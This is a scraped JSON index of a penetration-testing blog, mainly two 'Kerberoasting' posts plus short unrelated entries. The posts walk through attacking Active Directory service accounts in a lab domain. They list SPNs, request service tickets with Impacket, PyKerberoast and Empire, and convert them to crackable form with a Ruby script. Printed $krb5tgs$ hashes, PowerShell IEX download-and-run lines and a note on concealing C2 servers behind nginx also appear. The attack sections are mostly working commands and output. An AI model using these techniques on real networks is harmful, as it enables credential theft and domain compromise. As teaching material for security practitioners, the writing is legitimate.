oOvwZt8IsSE4pStAqrDCXAD9HbIi8G4QJ3dxMV875ThyihQKvp8ngHYRl8UfPXD+ YwuJhTm8OqDWiK2EgRDYX9VdtWktJp5FoVRBB4T0MAhMKqEZD5XNpNE6VGNBjJTQ Fq9/82rfL0m4DkLXOnWxLy6iEL9mPg/etC4P8LQWu/UFbNf4enwSL93sgdq6XV6z kAc+dv/0gTkoHO+ci4ivQilomtAYtDLU7LLE1nOBC+9gllB8rrnP6WOgIBzqC91K WLk8cqsjjdacSLcqGJ38rFQQUhVmWcHRqzzn7iiCuTsRulsUZ5EF3kduOVPVzrcy GA8yMDE2MDUxOTE1MzYwN1qmERgPMjAxNjA1MjAwMDUzMjRapxEYDzIwMTYwNTI2 MTQ1MzI0WqgSGxBTSVRUSU5HRFVDSy5JTkZPqSUwI6ADAgECoRwwGhsGa3JidGd0 GxBTSVRUSU5HRFVDSy5JTkZP ==================== * Saved to file : 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi I’ve cut the result down quite a bit as it would scroll for a bit in this format. Now the problem is that they are all text and for you to crack things or at least convert them into a format that JtR or oclHastcat can digest they need to be in binary format. So I made this script to convert and agent.log file from the output of extract_tickets back into their binary format with correct file names. My coding isn’t great, so please let me know how I can improve this script: #!/usr/bin/env ruby require 'base64' puts ARGV.inspect if ARGV.length != 1 puts \"Requires a file to parse, usually agent.log\" exit end border = \"====================\" bordercount = 0 ticket = [] filename = \"failed.log\" File.open(ARGV[0]).each do |line| if line.strip == border case bordercount when 2 File.open(filename, 'a') {|f| f.write(Base64.decode64(ticket.join))} bordercount = 0 ticket = [] filename = \"failed.log\" else bordercount = bordercount + 1 end else case bordercount when 1 filename = line.strip.split(\" : \")[1] puts \"Storing #{filename}\" when 2 ticket \u003c\u003c line.strip end end end Save that and just feed it an agent.log file from Empire and WA-LA! you have kirbi files. ruby parse.rb agent.log [\"agent.log\"] Storing 0-60a10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi Storing 1-40e10000-notanadmin@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi Storing 2-40a10000-notanadmin@MSSQLSvc~WIN2K8R2.sittingduck.info-SITTINGDUCK.INFO.kirbi Storing 3-40a10000-notanadmin@http~win10.sittingduck.info-SITTINGDUCK.INFO.kirbi Storing 4-40a10000-notanadmin@kadmin~changepw-SITTINGDUCK.IN","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:2:2","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Kirbi2John There are two versions of “kirbi2john”. Kerberoast version of kirbi2john.py by Michael Kramer (SySS GmbH) John the Ripper’s version of kirbi2john.py by Michael Kramer - modded by Dhiru Kholia root@wpad:~/johntheripper/run# ./kirbi2john.py /root/empire-dev/downloads/BDW3E2G2ZRKCUS3B/*.kirbi $krb5tgs$unkown:9e5ac5797343aabcb3ddc67df0f0fd88$d4c32f942980778547498a30f656d54f7c71a700397fa53dbe5ee86ee2e30e89586c8d447f6df8489fc1b53241cf87777712d5b1a0ebf066df08b12138a52b40aab0c25c00fd1db222f06e10277771315f3be538728a140abe9f2780761197c51f3d70fe630b898539bc3aa0d688ad848110d85fd55db5692d269e45a154410784f430084c2aa1190f95cda4d13a5463418c94d016af7ff36adf2f49b80e42d73a75b12f2ea210bf663e0fdeb42e0ff0b416bbf5056cd7f87a7c122fddec81daba5d5eb390073e76fff48139281cef9c8b88af4229689ad018b432d4ecb2c4d673810bef6096507caeb9cfe963a0201cea0bdd4a58b93c72ab238dd69c48b72a189dfcac541052156659c1d1ab3ce7ee2882b93b11ba5b14679105de476e3953d5ceb7328a5d221cfd323b7deb8234be1bf0d4b8c9f02463ad6da667323478f7acba2424e4311c837db608fc27b25a24d6c1315d7927d165a0859460ed65aaabaffd488b23dfcb01c8866aad556831370e89c25a6d8843aae676186f927eadf86f187d355f4a1d97472a44dc32fc52c4b6c40f42bb84f8589ee607eff2fd511bb6eaae90640a6dd2b3557ae5ae992d025aa13c25fafe9bd5b93aa36834a715c5dcde96bda38b880797852d2cff13324a1751a9b198b60ebf81c96b8dc5edf1474fe1fa53628f3aa53416e4062c503f1efb22a8ce11ab7ba8c40bc30c816568091ad051c55b3c8780964c87b5db241224bd3280eecb7e73f2921c770ccf41fbea8e43b2a1be0c6178c799fdbe8d1fffdd4a37a2aeeebb27a4f09f669203969b80e1ab7d6e28cae00af7fd3a6c731448c97356759ecc3eefec7f6ef155bd63b84bb25b1b66f8f1908ece15dbba12219c80b6797e04315889790f9c06c611314f8cd But all of that is hard and creates evidence. Lets look back at the tools PyKerberoast and Impacket’s GetUserSPNs.py and see if there is a better way: ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:2:3","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"PyKerberoast Source: https://github.com/skelsec/PyKerberoast Requirements: python-ldap This awesome work by @skelsec makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format. Usage: kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v] Example (I have snipped up some of the output to save space): root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b \"dc=sittingduck,dc=info\" -d sittingduck -u notanadmin [+]Starting... Password: $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af52b31c7c39808f02bceb2d728550e375ff7321f7383f4800445df2a27006950a0f88c69a447de1643a7418f056315c684382068701a62f627c6cafde81bbc657c865ddd828027cef1edc11228ea0b95caca91647fc4b581efb380e466d12e253309d65a11dcbe02b0de70e0aa9044350461ad5d4293a07e3cf588a05a04a7942b63f395c6eed5e8dc826160a7bc00e295df539e419b9a4c17762b3bc987bc339354892e51090d7a7ede236cf500438e57f47a4155cc38f8a07cfdb2e3f7033ce412a6f7856911d9cf95e659daf4269d1b31cf872b09dc86af614b95c457fc896d01fdfb0afc751d2279d4c715 [+]Done! ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:3:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Impacket Original Discussion: https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868 Added May 13 2016: https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa Source: https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py Just by adding a -request to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I’ve snipped up some of the output to save space): root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies Password: ServicePrincipalName Name MemberOf PasswordLastSet ---------------------------------- ---------- ---------------------------------------------------- ------------------- http/win10.sittingduck.info uberuser CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info 2015-11-10 23:47:21 MSSQLSvc/WIN2K8R2.sittingduck.info sqladmin01 2016-05-13 19:13:20 $krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283 $krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77 Much easier ;-) oh, and did I mention that if you use Impacket’s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them… References: ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:4:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Tools Kerberoast Impacket PyKerberoast Github - John the Ripper - Magnumripper Github - oclHashcat ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:5:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Presentations Tim Medin’s Slides - [Kicking the Guard Dog of Hades - slides](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) Tim Medin’s Video - Kicking the Guard Dog of Hades - video ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:6:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Other write ups Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild Ben Lincoln’s writeup on Brute Forcing Service Account Passwords Leon Jacob’s writeup on Kerberoast Sean Metcalf’s writeup on Kerberoast Sean Metcalf’s SPN directory ","date":"2016-05-21","objectID":"https://malicious.link/posts/2016/kerberoast-pt2/:7:0","tags":["kerberos","impacket","empire","powershell","spn","mimikatz"],"title":"Kerberoasting - Part 2","uri":"https://malicious.link/posts/2016/kerberoast-pt2/"},{"categories":null,"content":"Previous works: There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I’ll will be sure to reference it. Attacker KB Link: (to be updated later) Common Findings DB Link: (to be updated later) ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:0:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"What are SPNs [Service Principal Names](https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx) (SPNs) are: a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account.\" - MSDN Basically mapping a service running on a server to an account it’s running as so that it can do / accept kerberos authentication. Normally, these services, like “CIFS” (Windows Shares) run under the context of the computer account. ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:1:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Why would they be associated with users? I won’t say that this is the reason for the change, but for a long time Information Security professionals (and bad guys) have exploited the idea that services run as the all powerful “NT AUTHORITY\\SYSTEM” account. For those who don’t know, this means that if someone exploits one of those services, they are basically ROOT on that machine in the Windows world. One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the [NT AUTHORITY\\NETWORK SERVICE](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx) and [NT AUTHORITY\\LOCAL SERVICE](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx) accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did not have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again. Yes, I know there is such a thing as [Managed Service Accounts](https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx) now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that’s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I’ll discuss in the last section of this series. ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:2:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Why should I care? Any valid domain user can request a kerberos ticket for any domain service (or even services outside the domain as long as there is a trust there). Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. The users running these services usually are at the very least administrators on the computers for which they are a service on, but more commonly they are some sort of administrative account (Domain Admins). ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:3:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Listing SPNs Ok, so, now you know the background and why you want to do this attack, but how do we go about listing what SPNs are out there for the domain you are on. There are a ton of ways to do this: Just use the built in SetSPN.exe built into Windows Use the Get-SPN.ps1 that @_nullbind (Scott Sutherland) posted about on the NetSPI blog in a post titled Faster Domain Escalation using LDAP Use the PowerShell Empire port of @_nullbind’s Get-SPN powershell script Use Tim Medin - @timmedin’s GetUserSPNs VB script Use Tim Medin - @timmedin’s GetUserSPNs PowerShell script Use Impacket’s GetUserSPN.py - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:4:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"1. SetSPN SetSPN is a tool built into Windows and will do that job perfectly just as Tim Medin describes in his presentation and Kerberoast Github repo: C:\\\u003esetspn -t sittingduck -q */* Checking domain DC=sittingduck,DC=info CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info TERMSRV/DC1 TERMSRV/DC1.sittingduck.info Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.sittingduck.info ldap/DC1.sittingduck.info/DomainDnsZones.sittingduck.info ldap/DC1.sittingduck.info/ForestDnsZones.sittingduck.info DNS/DC1.sittingduck.info GC/DC1.sittingduck.info/sittingduck.info RestrictedKrbHost/DC1.sittingduck.info RestrictedKrbHost/DC1 RPC/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info HOST/DC1/SITTINGDUCK HOST/DC1.sittingduck.info/SITTINGDUCK HOST/DC1 HOST/DC1.sittingduck.info HOST/DC1.sittingduck.info/sittingduck.info E3514235-4B06-11D1-AB04-00C04FC2DCD2/ebee5e45-e3a3-481d-bf6c-29f3833e2392/sittingduck.info ldap/DC1/SITTINGDUCK ldap/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info ldap/DC1.sittingduck.info/SITTINGDUCK ldap/DC1 ldap/DC1.sittingduck.info ldap/DC1.sittingduck.info/sittingduck.info CN=krbtgt,CN=Users,DC=sittingduck,DC=info kadmin/changepw CN=Uber User,CN=Users,DC=sittingduck,DC=info http/win10.sittingduck.info CN=WIN7,CN=Computers,DC=sittingduck,DC=info RestrictedKrbHost/WIN7 HOST/WIN7 RestrictedKrbHost/WIN7.sittingduck.info HOST/WIN7.sittingduck.info CN=WIN2K8R2,OU=Domain Controllers,DC=sittingduck,DC=info TERMSRV/win2k8r2.sittingduck.info TERMSRV/WIN2K8R2 ldap/WIN2K8R2 ldap/win2k8r2.sittingduck.info ldap/win2k8r2.sittingduck.info/DomainDnsZones.sittingduck.info ldap/win2k8r2.sittingduck.info/ForestDnsZones.sittingduck.info ldap/win2k8r2.sittingduck.info/sittingduck.info ldap/win2k8r2.sittingduck.info/SITTINGDUCK ldap/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4._msdcs.sittingduck.info ldap/WIN2K8R2/SITTINGDUCK HOST/win2k8r2.sittingduck.info/sittingduck.info GC/win2k8r2.sittingduck.info/sittingduck.info HOST/win2k8r2.sittingduck.info/SITTINGDUCK HOST/WIN2K8R2/SITTINGDUCK DNS/win2k8r2.sittingduck.info E3514235-4B06-11D1-AB04-00C04FC2DCD2/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4/sittingduck.info Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/win2k8r2.sittingduck.info WSMAN/win2k8r2 WSMAN/win2k8r2.sittingduck.info RestrictedKrbHost/WIN2K8R2 HOST/WIN2K8R2 RestrictedKrbHost/WIN2K8R2.sittingduck.info HOST/WIN2K8R2.sittingduck.info CN=WIN10,CN=Computers,DC=sittingduck,DC=info RestrictedKrbHost/WIN10 HOST/WIN10 RestrictedKrbHost/win10.sittingduck.info HOST/win10.sittingduck.info CN=CA,CN=Computers,DC=sittingduck,DC=info WSMAN/CA WSMAN/CA.sittingduck.info RestrictedKrbHost/CA HOST/CA RestrictedKrbHost/CA.sittingduck.info HOST/CA.sittingduck.info CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info MSSQLSvc/WIN2K8R2.sittingduck.info Existing SPN found! Each line that starts with “CN” is an account\" and the SPNs under it are the ones associated with that account. Lots of great information can be determined just from the output of this command. Even though for cracking purposes we only want the SPNs associated with possibly weak password accounts (usually only User accounts), we should still pull this information down. ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:4:1","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Get-SPN Link: nullbind’s Get-SPN folder in the Powershellery repo This module gives you a lot more information than SetSPN did. Having the PasswordLastSet and LastLogon helps to figure out when and if an account has ever been used. In the example below the “sqladmin01” account has never logged on and was created recently. If this password cracks then there is a good chance that it is some common password set when setting up accounts Disclaimer: As of this writing, this module only works with PowerShell 3.0+ PS C:\\\u003e IEX (New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/ nullbind/Powershellery/master/Stable-ish/Get-SPN/Get-SPN.psm1\") PS C:\\\u003e Get-SPN -type service -search \"MSSQL*\" Name : MSSQL Service Admin SAMAccount : sqladmin01 Description : UserPrincipal : sqladmin01@sittingduck.info DN : CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info Created : 5/13/2016 11:13:20 PM LastModified : 5/13/2016 11:13:28 PM PasswordLastSet : 5/13/2016 7:13:20 PM AccountExpires : \u003cNever\u003e LastLogon : 12/31/1600 7:00:00 PM GroupMembership : SPN Count : 1 ServicePrincipalNames (SPN): MSSQLSvc/WIN2K8R2.sittingduck.info ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:4:2","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"PowerShell Empire Link: PowerShell Empire get_spn module This module basically just incorporates the script from above. Disclaimer: As of this writing, this module only works with PowerShell 3.0+ (Empire: situational_awareness/network/get_spn) \u003e info Name: Get-SPN Module: situational_awareness/network/get_spn NeedsAdmin: False OpsecSafe: True MinPSVersion: 2 Background: True OutputExtension: None Authors: @_nullbind Description: Displays Service Principal Names (SPN) for domain accounts based on SPN service name, domain account, or domain group via LDAP queries. Options: Name Required Value Description ---- -------- ------- ----------- Search False MSSQL* Search string for group, username, or service name. Wildcards accepted. Type False service 'group', 'user', or 'service' Agent True Agent to run module on. (Empire: situational_awareness/network/get_spn) \u003e ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:4:3","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Listing User SPNs ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:5:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"GetUserSPNs.vbs Link: Kerberoast’s GetUserSPNs.vbs GetUserSPNs was the first script to focus only on accounts that were Users. When you are looking at a network that has 40,000+ Windows boxes and all of the has the “HOST” SPN, it’s a lot to trudge through. This script cuts the fat and just gives you the list of SPNs that have a much higher chance of having their accounts cracked. C:\\temp\u003e cscript GetUserSPNs.vbs Microsoft (R) Windows Script Host Version 5.8 Copyright (C) Microsoft Corporation. All rights reserved. CN=Uber User,CN=Users,DC=sittingduck,DC=info User Logon: uberuser -- http/win10.sittingduck.info CN=krbtgt,CN=Users,DC=sittingduck,DC=info User Logon: krbtgt -- kadmin/changepw CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info User Logon: sqladmin01 -- MSSQLSvc/WIN2K8R2.sittingduck.info ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:5:1","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"GetUserSPNs.ps1 Link: Kerberoast’s GetUserSPNs.ps1 I really like this script because it tells you the time the password was last set. This allows for you to make educated selections on which accounts to attack with your password cracking. (More hashes needed to crack, the longer it takes) Below I use the IEX (Invoke-Expression) command in PowerShell to download and run the PowerShell script directly from Tim’s repository, but you could just as easily upload it and run it. PS C:\\\u003e IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercon tent.com/nidem/kerberoast/master/GetUserSPNs.ps1') ServicePrincipalNam Name MemberOf PasswordLastSet e ------------------- ---- -------- --------------- http/win10.sitti... Uber User CN=Domain Admins... 11/10/2015 11:47... kadmin/changepw krbtgt CN=Denied RODC P... 11/10/2015 6:18:... MSSQLSvc/WIN2K8R... MSSQL Service Admin 5/13/2016 7:13:2... ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:5:2","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Impacket Link: Impacket’s GetUserSPNs.py Impacket is a recent addition to the list of tools that perform SPN listing. Pull request #153 - TGS-Response code to work with windows AD was all it took to motivate @agsolino into making an example script and while PyKerberoast by @skelsec came first, it doesn’t have a plain “list” function so I wanted to save it for the extraction post. root@wpad:~/impacket/examples# ./GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies Password: ServicePrincipalName Name MemberOf PasswordLastSet ---------------------------------- ---------- ------------------------------------------------ ------------------- http/win10.sittingduck.info uberuser CN=Domain Admins,CN=Users,DC=sittingduck,DC=info 2015-11-10 23:47:21 MSSQLSvc/WIN2K8R2.sittingduck.info sqladmin01 2016-05-13 19:13:20 And that is it for now. We have listed all of the SPNs or just the ones we needed. In Part 2 we will make requests for the SPN tickets we want. References: ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:5:3","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Tools Kerberoast Impacket PyKerberoast Github - John the Ripper - Magnumripper Github - oclHashcat ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:6:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Presentations Tim Medin’s Slides - [Kicking the Guard Dog of Hades - slides](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf) Tim Medin’s Video - Kicking the Guard Dog of Hades - video ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:7:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Other write ups Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild Ben Lincoln’s writeup on Brute Forcing Service Account Passwords Leon Jacob’s writeup on Kerberoast Sean Metcalf’s writeup on Kerberoast Sean Metcalf’s SPN directory ","date":"2016-05-20","objectID":"https://malicious.link/posts/2016/kerberoast-pt1/:8:0","tags":["kerberos","impacket","empire","powershell","spn"],"title":"Kerberoasting - Part 1","uri":"https://malicious.link/posts/2016/kerberoast-pt1/"},{"categories":null,"content":"Once again, @egyp7 and I will be teaching both our Metasploit Basics course as well as the Mastery Course. ","date":"2016-05-01","objectID":"https://malicious.link/posts/2016/blackhat-usa-2016/:0:0","tags":["training"],"title":"BlackHat USA 2016","uri":"https://malicious.link/posts/2016/blackhat-usa-2016/"},{"categories":null,"content":"Metasploit Minute Season 6 is on the air! I know we have been away for a long while. The first episode is posted https://www.patreon.com/posts/5083466 each Monday a link will be posted on the Patreon site, or if you find RSS feeds easier, you can find it over at http://metasploitminute.com ","date":"2016-04-04","objectID":"https://malicious.link/posts/2016/metasploit-minute/:0:0","tags":["metasploit","video"],"title":"Metasploit Minute","uri":"https://malicious.link/posts/2016/metasploit-minute/"},{"categories":null,"content":"Hugo blogging platform","date":"2016-03-26","objectID":"https://malicious.link/posts/2016/another-blogging-platform/","tags":["blogging","hugo"],"title":"Another Blogging Platform","uri":"https://malicious.link/posts/2016/another-blogging-platform/"},{"categories":null,"content":"Yes yes yes, I know, another platform, but guess what, it’s my blog, so ne-ner-ne-ner-ne-ner Hugo removed what I didn’t like about Octopress (the generating / pushing of content using a mix of branches and such) The reason I moved from Blogger was I just can’t stand having to log in and be online to make posts. I love things like MarsEdit for doing offline posts to services like Blogger, but I never could get the formatting right when I was done, especiall for code, so I’m back to a markdown based system. Mostly because I like how it displays code (yes yes I know you can add highlightjs to blogger too) ","date":"2016-03-26","objectID":"https://malicious.link/posts/2016/another-blogging-platform/:0:0","tags":["blogging","hugo"],"title":"Another Blogging Platform","uri":"https://malicious.link/posts/2016/another-blogging-platform/"},{"categories":null,"content":"Created the 2016 UNOFFICIAL ShmooCon Hiring List. To get on the list is even easier now! Just complete the following form: http://goo.gl/forms/pbYI0TZ9dG (One small tip, first come first serve, so if you want to be on the top of the list it’s best to submit the best info you have vs waiting on anyone, I don’t change the list order for anyone.) Direct Link to Google Doc: https://docs.google.com/spreadsheets/d/15xqphPVEnH7o2urovHWjJiS1VCjdAqcPNB_HS0yRexU/ ","date":"2016-01-04","objectID":"https://malicious.link/posts/2016/2016-shmoocon-hiring-list/:0:0","tags":["shmoocon","hiring"],"title":"2016 Shmoocon Hiring List","uri":"https://malicious.link/posts/2016/2016-shmoocon-hiring-list/"},{"categories":null,"content":"Ever want to have all of your C2 go to the same box, have the functionality of Meterpreter, and Empire, while making it so if anyone goes to the actual site of your C2 all they get is something like Google? Nginx makes that possible, and instead of making a blog post that will disappear, I’ll point you at my combo in my “Attacker Knowledge Base” site: https://attackerkb.com/Combinations/ReverseProxyAttackTools and instead, show you the results once it’s setup: ","date":"2015-12-31","objectID":"https://malicious.link/posts/2015/reverse-proxying-attacker-tools/:0:0","tags":["metasploit","empire","nginx"],"title":"Reverse Proxying Attacker Tools","uri":"https://malicious.link/posts/2015/reverse-proxying-attacker-tools/"},{"categories":null,"content":"Metasploit: ","date":"2015-12-31","objectID":"https://malicious.link/posts/2015/reverse-proxying-attacker-tools/:0:1","tags":["metasploit","empire","nginx"],"title":"Reverse Proxying Attacker Tools","uri":"https://malicious.link/posts/2015/reverse-proxying-attacker-tools/"},{"categories":null,"content":"Empire: ","date":"2015-12-31","objectID":"https://malicious.link/posts/2015/reverse-proxying-attacker-tools/:0:2","tags":["metasploit","empire","nginx"],"title":"Reverse Proxying Attacker Tools","uri":"https://malicious.link/posts/2015/reverse-proxying-attacker-tools/"},{"categories":null,"content":"Hi. I’m Rob… and I have a problem. Lets just say, when you find the limitations on Amazon’s wishlist features for single items, you know you have a problem. My problem? I’m kinda addicted to Intel NUCs. They are so versitle, low-ish power consumption, and incredibly powerful and TINY. I carry 3 of these (the older / cheaper ones) around to run my trainings / classes from. The follow is my current wishlist. It is an i7 NUC w/ 500GB of high speed M2 SSD, plus a 1TB SATA SSD, and 32 GB of RAM… ya, thats right 1.5 TB of SSD space, and 32 gigs of RAM!! ","date":"2015-11-18","objectID":"https://malicious.link/posts/2015/intel-nuc-super-server/:0:0","tags":["nuc","server","intel","esxi"],"title":"Intel NUC Super Server","uri":"https://malicious.link/posts/2015/intel-nuc-super-server/"},{"categories":null,"content":" Intel NUC Kit NUC5i7RYH Barebone System $459.99 by Intel Link: http://amzn.com/B00WAS1FX6 ","date":"2015-11-18","objectID":"https://malicious.link/posts/2015/intel-nuc-super-server/:0:1","tags":["nuc","server","intel","esxi"],"title":"Intel NUC Super Server","uri":"https://malicious.link/posts/2015/intel-nuc-super-server/"},{"categories":null,"content":" Samsung 850 EVO 